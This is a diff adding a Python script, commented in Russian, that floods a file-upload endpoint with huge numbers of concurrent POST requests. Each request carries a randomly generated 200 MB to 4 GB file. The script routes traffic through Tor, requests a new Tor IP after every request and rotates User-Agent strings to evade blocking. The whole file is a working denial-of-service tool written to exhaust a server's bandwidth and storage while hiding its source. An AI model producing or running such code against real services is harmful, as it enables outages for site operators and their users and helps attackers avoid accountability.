@@ -1,0 +1,77 @@
+import aiohttp
+import asyncio
+import os
+import random
+import time
+import stem.control
+from aiohttp_socks import ProxyConnector
+
+# Настройки
+url = "http://127.0.0.1/upload"  # Указан сервер для загрузки файлов
+total_requests = 10**9  # 1 000 000 000 запросов
+concurrent_requests = 10**6  # 1 000 000 потоков
+delay = 0.4  # Задержка в секундах
+temp_folder = "./temp_files"  # Папка для временных файлов
+
+# Подключение через Tor (SOCKS5 proxy)
+proxy = "socks5h://127.0.0.1:9050"
+connector = ProxyConnector.from_url(proxy)
+
+# User-Agent для обхода защиты (рандомные браузеры)
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"
+]
+
+# Создаем временную папку для файлов
+os.makedirs(temp_folder, exist_ok=True)
+
+def generate_random_file():
+    """Создает случайный файл от 200MB до 4GB"""
+    size_mb = random.randint(200, 4096)  # Размер в MB
+    file_path = os.path.join(temp_folder, f"file_{random.randint(1000, 9999)}.bin")
+
+    with open(file_path, "wb") as f:
+        f.write(os.urandom(size_mb * 1024 * 1024))  # Записываем случайные байты
+
+    return file_path
+
+def change_tor_ip():
+    """Меняет IP в сети Tor"""
+    try:
+        with stem.control.Controller.from_port(port=9051) as controller:
+            controller.authenticate()
+            controller.signal(stem.Signal.NEWNYM)
+            print("[+] Новый IP в Tor запрошен")
+    except Exception as e:
+        print(f"[-] Ошибка смены IP: {e}")
+
+async def attack(session):
+    for _ in range(total_requests // concurrent_requests):
+        try:
+            file_path = generate_random_file()  # Генерируем файл
+            headers = {
+                "User-Agent": random.choice(user_agents),  # Рандомный User-Agent
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive"
+            }
+
+            async with session.post(url, headers=headers, data={"file": open(file_path, "rb")}) as response:
+                print(f"Файл {file_path} отправлен: {response.status}")
+            os.remove(file_path)  # Удаляем файл после отправки
+
+            change_tor_ip()  # Меняем IP после каждого запроса
+        except Exception as e:
+            print(f"Ошибка: {e}")
+
+        await asyncio.sleep(delay)  # Задержка между итерациями
+
+async def main():
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = [attack(session) for _ in range(concurrent_requests)]
+        await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    asyncio.run(main())
